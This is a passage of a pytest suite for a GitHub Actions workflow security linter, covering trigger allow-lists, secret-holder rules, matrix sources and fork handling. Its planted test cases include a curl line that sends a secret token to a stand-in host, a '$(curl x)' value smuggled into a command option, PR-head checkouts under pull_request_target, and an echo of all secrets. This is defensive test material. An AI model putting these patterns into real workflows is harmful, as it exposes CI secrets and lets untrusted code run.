        elif open(os.path.join(public_dir, f), "rb").read() != open(other, "rb").read():
            out.append(f"{f}: staged copy differs from the development repository's .github/workflows/scripts/{f}")
    return out


def ast_findings(public_dir, internal_dir, names):
    import ast

    return [
        f"{f}: staged copy is not AST-identical to the development repository's copy"
        for f in sorted(names)
        if ast.dump(ast.parse(open(os.path.join(public_dir, f)).read())) != ast.dump(ast.parse(open(os.path.join(internal_dir, f)).read()))
    ]


@dev_only
def test_each_staged_script_is_byte_identical_to_the_development_repositorys_copy_or_ast_identical_when_exempt():
    assert identity_findings(PUBLIC_SCRIPTS, DEV_SCRIPTS, IDENTITY_EXEMPT) == []
    assert ast_findings(PUBLIC_SCRIPTS, DEV_SCRIPTS, IDENTITY_EXEMPT) == []
    assert all(f in staged_names() for f in IDENTITY_EXEMPT)


def test_the_public_only_script_has_no_copy_in_the_development_repository_and_a_planted_copy_is_red(tmp_path):
    assert set(PUBLIC_ONLY) <= staged_names()
    pub, internal = tmp_path / "pub", tmp_path / "internal"
    pub.mkdir()
    internal.mkdir()
    (pub / "only.py").write_text("x = 1\n")
    found = identity_findings(str(pub), str(internal), {}, {})
    assert len(found) == 1 and found[0].startswith("only.py: staged, but the development repository has no copy"), found
    assert identity_findings(str(pub), str(internal), {}, {"only.py": "public only"}) == []
    (internal / "only.py").write_text("x = 1\n")
    found = identity_findings(str(pub), str(internal), {}, {"only.py": "public only"})
    assert found == ["only.py: listed in PUBLIC_ONLY, yet the development repository has a copy of it (a second, unpinned version)"], found
    print("RED public-only:", found[0])


def test_the_identity_pin_goes_red_on_a_planted_difference(tmp_path):
    pub, internal = tmp_path / "pub", tmp_path / "internal"
    pub.mkdir()
    internal.mkdir()
    (internal / "a.py").write_bytes(b"x = 1\n")
    (pub / "a.py").write_bytes(b"x = 2\n")
    found = identity_findings(str(pub), str(internal), {})
    assert found == ["a.py: staged copy differs from the development repository's .github/workflows/scripts/a.py"], found
    print("RED identity:", found[0])
    assert identity_findings(str(pub), str(internal), {"a.py": "a stated public difference"}) == []


def test_the_ast_pin_goes_red_on_a_planted_code_change_and_not_on_a_format_change(tmp_path):
    pub, internal = tmp_path / "pub", tmp_path / "internal"
    pub.mkdir()
    internal.mkdir()
    (internal / "a.py").write_text("x = [1,2]  # c\n")
    (pub / "a.py").write_text("x = [\n    1,\n    2,\n]\n")
    assert ast_findings(str(pub), str(internal), ["a.py"]) == []
    (pub / "a.py").write_text("x = [1, 3]\n")
    found = ast_findings(str(pub), str(internal), ["a.py"])
    assert found == ["a.py: staged copy is not AST-identical to the development repository's copy"], found
    print("RED ast:", found[0])


# ---------------------------------------------------------------------------------------------------------------------------------- nothing private in a public file
NEUTRAL_PATTERNS = {
    "a review-round or finding id": r"Diamond|(?i:round[ -]?[0-9])|\bF[0-9]+\b|\bw-[0-9]+\b",
    "a checklist id": r"(?i)checklist|\bg[0-9]{3}\b",
    "an internal report or tool name": r"BUILD-REPORT|p6gate",
}


def test_no_review_round_checklist_or_report_name_in_the_public_workflows_or_staged_scripts():
    """A tripwire for the words that name this deployment's review process. Scope: the public workflow files and the staged scripts (not the real-terms scan, which
    runs at publication and reads a vocabulary this file does not hold)."""
    texts = dict(public_texts())
    texts.update({f"scripts/{f}": open(os.path.join(PUBLIC_SCRIPTS, f)).read() for f in staged_names()})
    for what, pat in NEUTRAL_PATTERNS.items():
        hits = [(n, m.group()) for n, t in texts.items() for m in re.finditer(pat, t)]
        assert hits == [], (what, hits)
    assert re.search(
        NEUTRAL_PATTERNS["a review-round or finding id"], "see F10 of the Diamond of round 1"
    )  # the tripwire fires on the shape it is for


# ---- F18: matrix.* only from a literal list or a plan output
PLAN_JOB = "  plan:\n    runs-on: ubuntu-latest\n    outputs:\n      m: ${{ steps.p.outputs.m }}\n    steps:\n      - id: p\n        run: python3 .github/workflows/scripts/plan_bases.py\n"
MATRIX_HEAD = "name: p\non: pull_request_target\njobs:\n" + PLAN_JOB + "  j:\n    needs: plan\n    runs-on: ubuntu-latest\n"


@pytest.mark.parametrize(
    "matrix",
    [
        '    strategy:\n      matrix:\n        base: ["${{ github.head_ref }}"]\n',
        "    strategy:\n      matrix: ${{ fromJSON(github.event.pull_request.body) }}\n",
        "    strategy:\n      matrix: ${{ fromJSON(inputs.cells) }}\n",
        "",
    ],
    ids=["literal-with-head_ref", "fromJSON-of-the-event-body", "fromJSON-of-an-input", "no-matrix"],
)
def test_l4_red_on_matrix_values_that_are_not_from_a_plan_output_or_a_literal(matrix):
    found = l4_findings("planted.yml", MATRIX_HEAD + matrix + "    steps:\n      - run: echo ${{ matrix.base }}\n", allow_list=True)
    assert found and "matrix.* only from a literal matrix or fromJSON" in found[0], found
    print("RED L4 (matrix):", found[0])


@pytest.mark.parametrize(
    "plan_job",
    [
        PLAN_JOB.replace(
            "${{ steps.p.outputs.m }}", '{"base":["${{ github.head_ref }}"]}'
        ),  # the reviewer's plant: head_ref in the provider's own outputs
        PLAN_JOB.replace("${{ steps.p.outputs.m }}", "${{ format('{0}', github.event.pull_request.title) }}"),
        PLAN_JOB.replace("${{ steps.p.outputs.m }}", "${{ steps.other.outputs.m }}"),  # a step that does not exist in the provider
        PLAN_JOB.replace(
            "python3 .github/workflows/scripts/plan_bases.py", "echo m=$TITLE >> $GITHUB_OUTPUT"
        ),  # the step is not one of our named scripts
    ],
    ids=["head_ref-in-outputs", "event-field-in-outputs", "output-of-a-step-that-is-not-its-own", "step-runs-no-named-script"],
)
def test_l4_red_when_the_matrix_provider_exports_anything_but_a_named_script_step_output(plan_job):
    plant = (
        "name: p\non: pull_request_target\njobs:\n"
        + plan_job
        + "  j:\n    needs: plan\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: ${{ fromJSON(needs.plan.outputs.m) }}\n    steps:\n      - run: echo ${{ matrix.base }}\n"
    )
    found = l4_findings("planted.yml", plant, allow_list=True)
    assert found and "matrix.* only from" in found[0], found
    print("RED L4 (matrix provider):", found[0])


def test_l4_red_on_a_matrix_from_the_output_of_a_job_that_runs_pr_code_and_green_from_a_plan_job():
    head = "name: p\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n"
    tail = "  j:\n    needs: build\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: ${{ fromJSON(needs.build.outputs.m) }}\n    steps:\n      - run: echo ${{ matrix.base }}\n"
    found = l4_findings("planted.yml", head + tail, allow_list=True)
    assert found and "matrix.*" in found[0], found
    ok = (
        MATRIX_HEAD
        + "    strategy:\n      matrix: ${{ fromJSON(needs.plan.outputs.m) }}\n    steps:\n      - run: echo ${{ matrix.base }}\n"
    )
    assert l4_findings("ok.yml", ok, allow_list=True) == []


# ---- F16: the fork label event, and the plan's fork drop
def test_the_test_job_has_no_job_level_condition_on_the_event_pr_and_a_fork_label_event_still_tests_the_in_repo_candidates(
    tmp_path, monkeypatch, capsys
):
    """The delta review's probe, made a test. A `queue` label on a fork-head PR (#5) while in-repo #1 is queued: the plan lists #5 in `forks` and plans #1. If the test job's own
    `if` depended on the event's PR it would skip the WHOLE matrix and #1 would go untested (the merge job then went red). So the YAML must carry no such condition (checked
    here), and with the cell running, #1 merges and #5 is dequeued (the merge job, simulated here)."""
    import importlib
    import json as _json

    FakeGH = importlib.import_module(
        "tests.queue_fakes"
    ).FakeGH  # (the fake GitHub ships with the queue tests; its module puts the scripts folder on sys.path)
    mq = importlib.import_module("merge_queue")

    wf = load_text(public_texts()[MQ])
    assert "head" not in str(wf["jobs"]["test"].get("if", "")) and "github.event.pull_request" not in str(wf["jobs"]["test"].get("if", ""))
    gh = FakeGH()
    gh.base = "b" * 40
    for n in (1, 5):
        gh.add(n)
        gh.force_push(n, str(n) * 40)
    gh.prs[5]["head_repo"] = "stranger/fork"
    h1 = "1" * 40
    gh.jobs.append({"name": mq.test_job_name(1, h1), "status": "completed", "conclusion": "success"})
    (tmp_path / "v" / "mq-verdict-1").mkdir(parents=True)
    (tmp_path / "v" / "mq-verdict-1" / "verdict.json").write_text(
        _json.dumps(
            {
                "base": "main",
                "tests": [
                    {
                        "pr": 1,
                        "head": h1,
                        "base_sha": "b" * 40,
                        "merge_sha": "m" * 40,
                        "tree_sha": "t" * 40,
                        "result": "green",
                        "failures": [],
                    }
                ],
            }
        )
    )
    monkeypatch.setenv("GITHUB_RUN_ID", "77")
    monkeypatch.setenv("GITHUB_RUN_ATTEMPT", "1")
    monkeypatch.delenv("MQ_HOP", raising=False)
    monkeypatch.setattr(mq, "Api", lambda repo: gh)
    mq.main(
        [
            "merge",
            "--repo",
            "o/r",
            "--verdict-dir",
            str(tmp_path / "v"),
            "--candidates",
            _json.dumps({"main": [{"n": 1, "head": h1}]}),
            "--forks",
            "[5]",
        ]
    )
    assert gh.merged == [1] and "queue" not in gh.prs[5]["labels"]


def test_the_plan_drops_fork_heads_in_the_staged_scripts():
    plan_src = open(os.path.join(PUBLIC_SCRIPTS, "plan_bases.py")).read()
    merge_src = open(os.path.join(PUBLIC_SCRIPTS, "merge_queue.py")).read()
    assert fork_drop_findings(plan_src, merge_src) == []
    # planted: queued_prs no longer filters fork heads; plan_forks no longer lists them
    assert fork_drop_findings(plan_src, merge_src.replace("or is_fork_head(api, p)", "")) == [
        "queued_prs does not call is_fork_head (a fork head would be planned and tested)"
    ]
    assert fork_drop_findings(plan_src.replace("queued_forks(api, b)", "[]"), merge_src) == [
        "plan_bases.plan_forks does not call queued_forks (the dropped fork heads would not be listed for the merge job)"
    ]


# ---- F21: an API error is retried once and is not reported as a fork
def run_recheck_sequence(tmp_path, answers, repo="o/r", pr="7"):
    """The first step with a fake `gh` that answers from a sequence (one answer per call, the last repeats); MQ_RETRY_SLEEP=0."""
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    state = tmp_path / "calls"
    state.write_text("0")
    gh = bindir / "gh"
    gh.write_text(
        '#!/bin/bash\nn=$(cat "$STATE"); echo $((n+1)) > "$STATE"\nIFS=, read -ra A <<< "$ANSWERS"\ni=$n; [ "$i" -ge "${#A[@]}" ] && i=$((${#A[@]}-1))\n'
        'a="${A[$i]}"\nif [ "$a" = FAIL ]; then echo "HTTP 502" >&2; exit 1; fi\nif [ "$a" = NULL ]; then echo ""; exit 0; fi\necho "$a"\n'
    )
    gh.chmod(0o755)
    env = {
        "PATH": f"{bindir}:/usr/bin:/bin",
        "MQ_REPO": repo,
        "MQ_PR": pr,
        "GH_TOKEN": "x",
        "STATE": str(state),
        "ANSWERS": ",".join(answers),
        "MQ_RETRY_SLEEP": "0",
    }
    p = subprocess.run(["bash", "-e", "-c", recheck_script()], env=env, capture_output=True, text=True, timeout=60)
    return p, int(state.read_text())


def test_a_transient_api_error_is_retried_once_and_a_persistent_one_is_not_called_a_fork(tmp_path):
    p, calls = run_recheck_sequence(tmp_path, ["FAIL", "o/r"])
    assert p.returncode == 0 and calls == 2, (p.stdout, p.stderr)  # the first call fails, the retry reads the real head repository
    (tmp_path / "b").mkdir()
    p, calls = run_recheck_sequence(tmp_path / "b", ["FAIL"])
    assert (
        p.returncode == 1
        and calls == 2
        and "could not read the head repository of PR 7 (API error, retried once: HTTP 502)" in p.stdout
        and "refused" not in p.stdout
    ), (p.stdout, calls)
    (tmp_path / "c").mkdir()
    p, calls = run_recheck_sequence(tmp_path / "c", ["stranger/fork"])
    assert (
        p.returncode == 1 and calls == 1 and "has its head in 'stranger/fork'" in p.stdout
    )  # a real mismatch is refused at once, not retried


# ---- F24: the mode switch
def test_the_public_set_is_where_the_mode_says_it_is():
    if DEV_REPO:
        # the map's source folder, read from the release tool's text (not imported: the tool does not ship, and a shipped test must import only shipped modules)
        release_tool = os.path.join(ROOT, "tools", "release_prep.py")
        assert os.path.exists(release_tool), (
            "a tree that has publish/github/workflows/ but no tools/release_prep.py is neither the development repository nor the published tree"
        )
        source = open(release_tool).read()
        found_map = re.search(r'^MAP_SOURCE\s*=\s*"([^"]+)"', source, re.M)
        assert found_map, "tools/release_prep.py has no MAP_SOURCE constant: the mode switch cannot be checked against the map"
        map_source = found_map.group(1)
        assert map_source == "publish/github/workflows/" and SOURCE_DIR == os.path.join(ROOT, map_source.rstrip("/")), (
            map_source,
            SOURCE_DIR,
        )
    else:
        assert not os.path.exists(SOURCE_DIR)  # the published tree has the public set in .github/workflows and no publish/ copy of it
        assert PUBLIC_DIR == DOT_DIR


# ---- F27: the trigger allow-list
REVIEWERS_MERGE_GROUP_PLANT = """name: p
on: merge_group
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
      - run: make test
        env:
          DEPLOY: ${{ secrets.DEPLOY_KEY }}
"""


def test_the_reviewers_merge_group_plant_is_red_by_the_trigger_allow_list():
    """The delta review's plant: `merge_group`, a job holding a secret, a ref-less checkout (the merge-group commit holds PR code), then `make test`. The other lints do not
    reason about this trigger's default checkout; the allow-list refuses the trigger outright."""
    wf = load_text(REVIEWERS_MERGE_GROUP_PLANT)
    found = trigger_findings("planted.yml", wf)
    assert found and found[0].startswith(
        "L0 planted.yml: trigger 'merge_group' is not allowed (its default checkout is the merge-group commit"
    ), found
    print("RED L0:", found[0])


@pytest.mark.parametrize("trigger", sorted(REFUSED_TRIGGERS))
def test_each_refused_trigger_is_red_with_its_reason(trigger):
    wf = load_text(
        f"name: p\non:\n  {trigger}:\njobs:\n  j:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo hi\n"
    )
    found = trigger_findings("planted.yml", wf)
    assert found == [f"L0 planted.yml: trigger {trigger!r} is not allowed ({REFUSED_TRIGGERS[trigger]})"], found
    print("RED L0:", found[0])


@pytest.mark.parametrize("form", ["on: fork", "on: [push, fork]", "on:\n  push:\n  fork:"])
def test_any_trigger_outside_the_allow_list_is_red_in_every_yaml_form(form):
    wf = load_text(f"name: p\n{form}\njobs:\n  j:\n    runs-on: ubuntu-latest\n    permissions: {{}}\n    steps:\n      - run: echo hi\n")
    assert trigger_findings("planted.yml", wf) == ["L0 planted.yml: trigger 'fork' is not allowed (not in the allow-list)"]


def test_the_allowed_triggers_pass_and_the_real_files_use_only_them():
    for e in ALLOWED_TRIGGERS:
        wf = load_text(
            f"name: p\non:\n  {e}:\njobs:\n  j:\n    runs-on: ubuntu-latest\n    permissions: {{}}\n    steps:\n      - run: echo hi\n"
        )
        assert trigger_findings("ok.yml", wf) == [], e
    for n, x in public_texts().items():
        used = events(load_text(x))
        assert used <= set(ALLOWED_TRIGGERS) | set(L0_EXCEPTIONS.get(n, {})), (n, used)
    # a refused trigger is used by the one file that is named for it, and by no other
    assert {n for n, x in public_texts().items() if events(load_text(x)) & set(REFUSED_TRIGGERS)} == set(L0_EXCEPTIONS)


# ---------------------------------------------------------------------------------------------------------------------------------- L2 (d): the overlay secret and its one holder
def holders_of(secret):
    return [(n, j) for n, t in public_texts().items() for j, job in load_text(t)["jobs"].items() if mentions_secret(job, secret)]


def test_each_secret_is_named_by_its_listed_jobs_and_no_other_job_of_the_public_set_and_each_exception_has_its_reason():
    """Not vacuous: the rule has real holders to judge, the table's reason is stated, and the table, the shapes and the files agree."""
    assert holders_of(OVERLAY_SECRET) == [(CC, "detect"), (LC, "leak-check")]
    assert holders_of(MINIMISE_SECRET) == [(CC, "minimise")] and holders_of(ALERT_SECRET) == [(CC, "alert")]
    assert sorted(L2_SECRET_EXCEPTIONS) == sorted(HOLDER_SHAPE) == sorted({h for s in SECRETS for h in holders_of(s)})
    assert all(isinstance(v, str) and len(v) > 40 for v in L2_SECRET_EXCEPTIONS.values())
    assert {HOLDER_SHAPE[h]["secret"] for h in HOLDER_SHAPE} == set(SECRETS)
    for (n, j), spec in HOLDER_SHAPE.items():
        wf = load_text(public_texts()[n])
        assert holds_secret_or_write(wf, wf["jobs"][j]) and not runs_pr_code(wf, wf["jobs"][j]), (n, j)
        assert l2_secret_findings(n, wf) == [] and l2_findings(n, wf) == [], (n, j)
        assert spec["triggers"] == events(wf) and wf["jobs"][j]["environment"] == spec["environment"]


def test_the_leak_check_workflow_runs_on_the_four_events_and_the_literal_runner_and_reads_the_pr_only_through_the_script():
    lc = load_text(public_texts()[LC])
    on = lc.get("on", lc.get(True))
    assert on == {"pull_request_target": {"types": ["opened", "synchronize", "reopened", "edited"]}}, on
    job = lc["jobs"]["leak-check"]
    assert job["runs-on"] == LITERAL and job["environment"] == "leak-check"
    assert job["permissions"] == {"contents": "read", "pull-requests": "read"}
    assert [s.get("uses", "").split("@")[0] or s["run"] for s in job["steps"]] == [
        "actions/checkout",
        "python3 .github/workflows/scripts/leak_check.py --max-terms-age-hours 192",
    ]
    assert "ref" not in (job["steps"][0].get("with") or {}) and "repository" not in (job["steps"][0].get("with") or {})
    # nothing of the PR event is in an expression of the run text (L4's allow-list is green over the file; this names the one thing that must hold here)
    assert "github.event" not in job["steps"][1]["run"]


def planted_lc(old, new):
    wf, text = mutate(LC, old, new)
    return wf


@pytest.mark.parametrize(
    ("what", "old", "new", "expect"),
    [
        (
            "a second trigger",
            "on:\n  pull_request_target:",
            "on:\n  pull_request:\n    types: [opened]\n  pull_request_target:",
            "has triggers",
        ),
        (
            "a self-hosted runner",
            "runs-on: ubuntu-latest   # literal, always",
            "runs-on: ${{ vars.CI_RUNNER || 'ubuntu-latest' }}",
            "must be the literal",
        ),
        ("no environment", "    environment: leak-check", "    # no environment", "names no `environment:`"),
        ("a write permission", "      pull-requests: read", "      pull-requests: write", "read values only"),
        (
            "a checkout of the head",
            "        with:\n          persist-credentials: false",
            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false",
            "checks out",
        ),
        (
            "a checkout of another repository",
            "        with:\n          persist-credentials: false",
            "        with:\n          repository: someone/else\n          persist-credentials: false",
            "checks out",
        ),
        (
            "persisted credentials",
            "          persist-credentials: false",
            "          persist-credentials: true",
            "persist-credentials: false",
        ),
        (
            "a job-level env holding the secret",
            "    timeout-minutes: 15",
            "    timeout-minutes: 15\n    env:\n      T: ${{ secrets.OVERLAY_READ_TOKEN }}",
            "job-level `env:`",
        ),
        (
            "the secret in the run text",
            "        run: python3 .github/workflows/scripts/leak_check.py",
            "        run: python3 .github/workflows/scripts/leak_check.py ${{ secrets.OVERLAY_READ_TOKEN }}",
            "outside its `env:`",
        ),
        (
            "the secret passed to a second command",
            "        run: python3 .github/workflows/scripts/leak_check.py",
            '        run: curl -H "$OVERLAY_READ_TOKEN" https://example.invalid/',
            "other than one staged script",
        ),
        (
            "a third-party action beside the secret",
            "      - name: check the pull request's",
            "      - uses: someone/some-action@v1\n      - name: check the pull request's",
            "only actions/checkout",
        ),
        (
            "an added pip install step",
            "      - name: check the pull request's",
            "      - run: pip install requests\n      - name: check the pull request's",
            "exactly two steps",
        ),
        (
            "an added step after the secret step",
            "        run: python3 .github/workflows/scripts/leak_check.py --max-terms-age-hours 192\n",
            "        run: python3 .github/workflows/scripts/leak_check.py --max-terms-age-hours 192\n      - run: echo done\n",
            "exactly two steps",
        ),
        (
            "the secret step running another staged script",
            "        run: python3 .github/workflows/scripts/leak_check.py --max-terms-age-hours 192",
            "        run: python3 .github/workflows/scripts/merge_queue.py",
            "exactly two steps",
        ),
        (
            "a non-numeric option on the secret step",
            "leak_check.py --max-terms-age-hours 192",
            "leak_check.py --max-terms-age-hours $(curl x)",
            "exactly two steps",
        ),
        (
            "the secret at workflow level",
            "permissions: {}\n\nconcurrency:",
            "permissions: {}\nenv:\n  T: ${{ secrets.OVERLAY_READ_TOKEN }}\n\nconcurrency:",
            "workflow-level key",
        ),
    ],
)
def test_l2_d_red_on_each_planted_deviation_of_the_overlay_secrets_holder(what, old, new, expect):
    wf = planted_lc(old, new)
    found = l2_secret_findings(LC, wf) + l2_findings(LC, wf)
    assert any(expect in f for f in found), (what, found)
    print("RED L2 (d):", what, "->", [f for f in found if expect in f][0])


@pytest.mark.parametrize(
    "ref",
    [
        "      - run: echo ${{ secrets.OVERLAY_READ_TOKEN }}",
        "      - run: echo ${{ secrets.overlay_read_token }}",
        "      - run: echo ${{ secrets['OVERLAY_READ_TOKEN'] }}",
        "      - run: echo ${{ toJSON(secrets) }}",
    ],
)
def test_l2_d_red_on_any_other_job_that_reads_the_overlay_secret_by_any_spelling(ref):
    other = "  other:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n" + ref + "\n"
    text = public_texts()[LC] + other
    found = l2_secret_findings(LC, load_text(text))
    assert any("job 'other'" in f for f in found), (ref, found)
    print("RED L2 (d), another job:", ref.strip(), "->", found[0])
    # the same job in the other workflows of the set is also red (the secret is named by workflow file and job)
    found = l2_secret_findings(CI, load_text(public_texts()[CI] + other))
    assert any("job 'other'" in f for f in found), found


def test_l2_d_does_not_flag_the_other_workflows_secrets_and_flags_a_renamed_holder_job():
    for n in (CI, MQ):
        assert l2_secret_findings(n, load_text(public_texts()[n])) == []
    wf = load_text(public_texts()[LC].replace("  leak-check:\n    name: leak-check", "  renamed:\n    name: leak-check"))
    found = l2_secret_findings(LC, wf)
    assert any("job 'renamed' references the secret OVERLAY_READ_TOKEN and is not its named holder" in f for f in found), found
    print("RED L2 (d), a holder not in the table:", found[0])


# ---------------------------------------------------------------------------------------------------------------------------------- the comment-containment workflow: L0 exceptions and L2 (d) holders
def cc_text():
    return public_texts()[CC]


def cc_planted(old, new, job=None, count=1):
    """The comment workflow's text with `old` replaced by `new`, inside the section of `job` only when given (the three jobs share lines)."""
    text = cc_text()
    if job is None:
        assert old in text, old
        return load_text(text.replace(old, new, count))
    start = text.index(f"\n  {job}:\n")
    nxt = [text.index(f"\n  {o}:\n") for o in ("detect", "minimise", "alert") if o != job and text.index(f"\n  {o}:\n") > start]
    end = min(nxt) if nxt else len(text)
    section = text[start:end]
    assert old in section, (job, old)
    return load_text(text[:start] + section.replace(old, new, count) + text[end:])


def test_l0_names_the_comment_workflow_for_its_two_event_triggers_with_a_reason_each_pins_its_schedule_and_only_that_file():
    wf = load_text(cc_text())
    assert trigger_findings(CC, wf) == [] and events(wf) == set(L0_EXCEPTIONS[CC]) | {"schedule"}
    assert set(L0_EXCEPTIONS[CC]) == {"issue_comment", "issues"} <= set(REFUSED_TRIGGERS)
    assert all(len(e["reason"]) > 40 and e["types"] for e in L0_EXCEPTIONS[CC].values())
    assert list(L0_EXCEPTIONS) == [CC] and list(L0_SCHEDULE) == [CC]
    # the same file text under any other name is red, trigger by trigger, with the refused trigger's own reason
    found = trigger_findings("other.yml", wf)
    assert sorted(found) == sorted(f"L0 other.yml: trigger {e!r} is not allowed ({REFUSED_TRIGGERS[e]})" for e in L0_EXCEPTIONS[CC]), found
    print("RED L0, the comment workflow under another file name:", found[0])
    # and another real workflow that adds one of the two is red
    for rel, trig in ((LC, "issue_comment"), (CI, "issues"), (MQ, "issues"), (LC, "issue_comment")):
        text = public_texts()[rel]
        text = re.sub(r"^on:\n", f"on:\n  {trig}:\n    types: [created, edited]\n", text, count=1, flags=re.M)
        found = trigger_findings(rel, load_text(text))
        assert found == [f"L0 {rel}: trigger {trig!r} is not allowed ({REFUSED_TRIGGERS[trig]})"], (rel, trig, found)


@pytest.mark.parametrize("review_event", ["pull_request_review", "pull_request_review_comment"])
def test_l0_refuses_the_review_events_in_the_comment_workflow_as_everywhere_else(review_event):
    wf = cc_planted("on:\n  issue_comment:", f"on:\n  {review_event}:\n    types: [submitted]\n  issue_comment:")
    found = trigger_findings(CC, wf)
    assert any(f"trigger {review_event!r} is not allowed" in f for f in found), found
    print("RED L0, a review event in the comment workflow:", found[0])


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ('    - cron: "*/10 * * * *"', '    - cron: "* * * * *"'),
        ('    - cron: "*/10 * * * *"', '    - cron: "*/10 * * * *"\n    - cron: "0 * * * *"'),
        ("  schedule:\n", "  schedule:\n    # a comment\n"),  # harmless: must stay green
    ],
)
def test_l0_pins_the_comment_workflows_schedule_to_the_one_cron_line(old, new):
    wf = cc_planted(old, new)
    found = trigger_findings(CC, wf)
    if "comment" in new:
        assert found == []
    else:
        assert any("trigger 'schedule' is" in f for f in found), found


def test_l0_red_when_the_comment_workflow_loses_its_schedule():
    wf = cc_planted('  schedule:\n    - cron: "*/10 * * * *"\n', "")
    assert any("are not exactly the" in f for f in trigger_findings(CC, wf))


@pytest.mark.parametrize("trigger", sorted(L0_EXCEPTIONS[CC]))
def test_l0_red_when_the_named_file_gives_one_of_its_triggers_the_wrong_types(trigger):
    good = L0_EXCEPTIONS[CC][trigger]["types"]
    header = f"  {trigger}:\n    types: [{', '.join(good)}]"
    for bad in (f"  {trigger}:", f"  {trigger}:\n    types: [{', '.join(good)}, labeled]", f"  {trigger}:\n    types: [{good[0]}]"):
        wf = cc_planted(header, bad)
        found = trigger_findings(CC, wf)
        assert any(f"trigger {trigger!r} runs on types" in f for f in found), (trigger, bad, found)
    print("RED L0, wrong types:", found[0])


def test_l0_red_when_the_named_file_adds_any_other_trigger():
    wf = cc_planted("on:\n  issue_comment:", "on:\n  workflow_dispatch:\n  issue_comment:")
    assert any("are not exactly the" in f for f in trigger_findings(CC, wf))
    wf = cc_planted("on:\n  issue_comment:", "on:\n  pull_request_target:\n    types: [opened]\n  issue_comment:")
    assert any("are not exactly the" in f for f in trigger_findings(CC, wf))
    wf = cc_planted("  issues:\n    types: [opened, edited]\n", "")
    assert any("are not exactly the" in f for f in trigger_findings(CC, wf))


@pytest.mark.parametrize("event", ["pull_request_review", "pull_request_review_comment"])
def test_a_refless_checkout_under_a_review_event_is_pr_code_because_its_default_is_the_merge_commit(event):
    text = f"name: p\non:\n  {event}:\npermissions: {{}}\njobs:\n  j:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n{BASE_CO}"
    wf = load_text(text)
    assert runs_pr_code(wf, wf["jobs"]["j"])
    ok = text + "        with:\n          ref: ${{ github.event.repository.default_branch }}\n"
    wf = load_text(ok)
    assert not runs_pr_code(wf, wf["jobs"]["j"])
    # and a self-hosted label under it is red by L1, like under pull_request
    wf = load_text(text.replace("runs-on: ubuntu-latest", "runs-on: self-hosted"))
    assert l1_findings("p.yml", wf) == ["L1 p.yml: job 'j' runs-on 'self-hosted' (must be the literal ubuntu-latest)"]
    # the issue events do not default to a merge commit
    for e in ("issue_comment", "issues"):
        wf = load_text(text.replace(event, e))
        assert not runs_pr_code(wf, wf["jobs"]["j"])


def test_l2_d_every_comment_workflow_holder_is_green_and_each_job_holds_one_secret():
    wf = load_text(cc_text())
    assert l2_secret_findings(CC, wf) == [] and l2_findings(CC, wf) == [] and l1_findings(CC, wf) == [] and l3_findings(CC, wf) == []
    assert l4_findings(CC, cc_text(), allow_list=True) == []
    held = {j: [s for s in SECRETS if mentions_secret(job, s)] for j, job in wf["jobs"].items()}
    assert held == {"detect": [OVERLAY_SECRET], "minimise": [MINIMISE_SECRET], "alert": [ALERT_SECRET]}, held


CC_PERSIST = "          persist-credentials: false\n"
CC_DEVIATIONS = [
    # (what, job or None, old, new, expect)
    ("a checkout of the PR head", "minimise", CC_PERSIST, "          ref: ${{ github.event.pull_request.head.sha }}\n" + CC_PERSIST, "checks out with a `ref`"),
    ("a checkout of the merge ref", "alert", CC_PERSIST, "          ref: ${{ github.sha }}\n" + CC_PERSIST, "checks out with a `ref`"),
    ("a checkout of the default branch by ref", "detect", CC_PERSIST, "          ref: main\n" + CC_PERSIST, "checks out with a `ref`"),
    ("a checkout of another repository", "detect", CC_PERSIST, "          repository: someone/else\n" + CC_PERSIST, "checks out with a `ref` or a `repository`"),
    ("persisted credentials", "minimise", "persist-credentials: false", "persist-credentials: true", "persist-credentials: false"),
    ("a self-hosted runner", "alert", "runs-on: ubuntu-latest   # literal, always", "runs-on: ${{ vars.CI_RUNNER }}", "must be the literal"),
    ("another job's environment", "minimise", "environment: comment-minimise", "environment: leak-check", "names the environment 'leak-check'"),
    ("no environment", "alert", "    environment: comment-alert   # the scope of the alert token\n", "", "names no `environment:`"),
    ("a write permission", "minimise", "      contents: read\n    steps:", "      contents: write\n    steps:", "read values only"),
    ("a second step", "minimise", "        run: python3 .github/workflows/scripts/comment_containment.py minimise", "        run: python3 .github/workflows/scripts/comment_containment.py minimise\n      - run: echo done", "exactly two steps"),
    ("another subcommand on the alert job", "alert", "comment_containment.py alert", "comment_containment.py detect", "exactly two steps"),
    ("another script on the detect job", "detect", "comment_containment.py detect", "leak_check.py", "exactly two steps"),
    ("a shell option on the minimise job", "minimise", "comment_containment.py minimise", "comment_containment.py minimise --x $(curl x)", "other than one staged script"),
    ("a third-party action beside the secret", "alert", "      - name: open the alerts", "      - uses: someone/some-action@v1\n      - name: open the alerts", "only actions/checkout"),
    ("the minimise secret in the alert job", "alert", "          OVERLAY_ALERT_TOKEN:", "          COMMENT_MINIMISE_TOKEN: ${{ secrets.COMMENT_MINIMISE_TOKEN }}\n          OVERLAY_ALERT_TOKEN:", "a secret other than its own"),
    ("the alert secret in the detect job", "detect", "          LC_OVERLAY_REPO:", "          OVERLAY_ALERT_TOKEN: ${{ secrets.OVERLAY_ALERT_TOKEN }}\n          LC_OVERLAY_REPO:", "a secret other than its own"),
    ("the secret in the run text", "minimise", "scripts/comment_containment.py minimise", "scripts/comment_containment.py minimise ${{ secrets.COMMENT_MINIMISE_TOKEN }}", "outside its `env:`"),
    ("a job-level env holding a secret", "alert", "    timeout-minutes: 5", "    timeout-minutes: 5\n    env:\n      T: ${{ secrets.OVERLAY_ALERT_TOKEN }}", "job-level `env:`"),
    ("a comment's text in a step env", "detect", "          LC_OVERLAY_REPO:", "          BODY: ${{ github.event.comment.body }}\n          LC_OVERLAY_REPO:", "not on the holder allow-list"),
